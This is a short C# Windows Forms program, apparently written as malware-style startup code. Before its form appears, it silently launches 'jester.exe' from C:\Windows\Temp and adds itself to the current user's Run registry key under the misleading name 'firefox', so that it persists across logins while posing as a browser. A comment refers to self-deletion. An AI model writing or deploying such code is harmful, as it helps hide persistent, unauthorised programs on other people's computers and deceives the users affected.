using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace auto_inicio
{
    static class Program
    {

        /// <summary>
        /// Punto de entrada principal para la aplicación.
        /// </summary>
        [STAThread]
        static void Main()
        {
            SetStartup();




            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        static void SetStartup()



        {
            // auto eliminado 
            Thread.Sleep(6000);
            System.Diagnostics.Process.Start(@"C:\Windows\Temp\\\jester.exe");
            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            if (rk.GetValue("firefox") == null && !Application.ExecutablePath.Contains("rundll.exe"))
            {
                rk.SetValue("firefox", "\"" + Application.ExecutablePath + "\"");
            }

           // System.Diagnostics.Process.Start(@"C:\\Program Files\\\jester.exe");
        }
    }
}












